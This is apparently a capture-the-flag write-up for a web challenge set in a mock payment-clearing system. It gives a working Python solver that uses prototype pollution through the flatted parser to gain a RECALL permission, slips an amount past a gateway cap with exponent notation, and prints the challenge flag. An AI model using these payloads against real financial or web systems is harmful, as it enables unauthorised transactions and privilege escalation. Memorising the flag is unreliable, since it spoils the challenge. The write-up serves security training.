# Cutover

**Category:** Web

## Solution

### 1. Find the batch causing the shortfall

I compared the batch register, manifests, and journal. `MRN-9F6EA9`, from Cardell Provincial Bank, declared `35,300,000`, but its instructions added up to `38,300,000`.

The journal's previous maximum was `15,100,000`. The liquidity figures also lined up: `54,100,000 - 38,300,000 = 15,800,000`, below the required floor of `24,800,000`. That made this batch the recall target.

### 2. Make the permission check inherit RECALL

The engine checked `grants["RECALL"] === true` on arrays. The intake parser used `flatted 3.4.1`. I set the crafted wire-format `basis` reference to `"__proto__"`, which resolved through the parser's internal input array to the live `Array.prototype`.

The later merge wrote the manifest hints onto that object:

```js
const basis = manifest.basis ?? {};
merge(basis, ROUTING_DEFAULTS);
merge(basis, manifest.hints ?? {});   // for (key of hints) basis[key] = hints[key]
```

I supplied `RECALL: true` through the crafted manifest. Once that property existed on `Array.prototype`, the permission lookup inherited it and allowed the operator session to recall batches.

### 3. Send the amount in exponent notation

The gateway's exposure cap was `23,900,000`, so a plain `38300000` was rejected. Its screening rules deferred numbers it could not classify to the downstream engine.

I sent `3.83e7`. The gateway deferred screening, and the engine's JSON parser read the same amount as `38300000`.

### 4. Calculate the receipt unlock

The accepted recall first returned `recall.held`, with this input:

```text
cutover|MRN-9F6EA9|38300000
```

I calculated its SHA-256 hex digest and resubmitted the recall with that value in `unlock`. The receipt's `authorization` field contained the flag.

### 5. Put the steps together

I used this solver to send the manifest, submit the recall, and unlock the receipt. `BASE` points to my original team instance.

```python
#!/usr/bin/env python3
import hashlib, json, requests

BASE = "http://w01.ctf.chronos-security.ro:33095"   # per-team instance URL
s = requests.Session()
s.get(BASE + "/api/v1/schema")                       # seeds cutover_sid cookie

# ---- 1. triage: manifest anomaly (declared vs settled sum) ------------------
batches = s.get(BASE + "/batches").json()["batches"]
sums    = {b["id"]: sum(i["amountMinor"] for i in b["instructions"]) for b in batches}
for bid, d in ((b["id"], sums[b["id"]] - b["declaredAggregateMinor"]) for b in batches):
    if d:
        print(f"manifest mismatch: {bid} delta={d:+d}")   # MRN-9F6EA9 delta=+3000000

# ---- 2. tier bypass: prototype pollution via the manifest ------------------
bic   = s.get(BASE + "/reference/participants").json()["participants"][0]["bic"]
vdate = s.get(BASE + "/reference/clock").json()["clock"]["valueDate"]
manifest = ('[{{"batch":"1","originator":"2","valueDate":"3","declaredAggregateMinor":1000000,'
            '"instructions":"4","hints":"5","basis":"__proto__"}},"POLL-PWN",{bic},{vdate},'
            '["7"],{{"RECALL":true}},"__proto__",{{"counterparty":"8","amountMinor":1000000}},'
            f'"NOSTRO/{bic}"]').format(bic=json.dumps(bic), vdate=json.dumps(vdate))
r = s.post(BASE + "/api/v1/manifests", data=manifest.encode(),
           headers={"Content-Type": "text/plain"})
print("pollution manifest:", r.status_code, r.json())        # 201 queued:true

def recall(batch, value, unlock=None):
    # exponent notation (RFC 8259 s6) -> gateway "defer", engine reads exact int
    payload = f'{{"type":"RECALL","batch":"{batch}","value":{value:g}'
    if unlock:
        payload += f',"unlock":"{unlock}"'
    return s.post(BASE + "/api/v1/instructions", data=payload + "}",
                  headers={"Content-Type": "application/json"}).json()

# ---- 3. oracle: the batch that returns recall.held is state.hostile ---------
held = next((j for bid, v in sums.items()
             if (j := recall(bid, v)).get("error") == "recall.held"), None)
inp = held["detail"]["unlock_input"]
batch, settled = inp.split("|")[1], int(inp.split("|")[2])
print("hostile batch:", batch, "settled:", settled)

# ---- 4. unlock + receipt -----------------------------------------------------
unlock = hashlib.sha256(inp.encode()).hexdigest()
receipt = recall(batch, settled, unlock)["receipt"]
print(json.dumps(receipt, indent=2))
print("\nFLAG:", receipt["authorization"])
```

The intermediate responses showed the manifest mismatch, the permission change, and the held recall:

```text
manifest mismatch: MRN-9F6EA9 delta=+3000000
pollution manifest: 201 {'batch': 'POLL-PWN', 'queued': True, 'position': 14}
hostile batch: MRN-9F6EA9 settled: 38300000
```

## Flag

```text
CSCTF{Man5JZVdDaE8XJAtT0XVlaPD}
```

> **Note:** The URL and flag are specific to the original team instance.
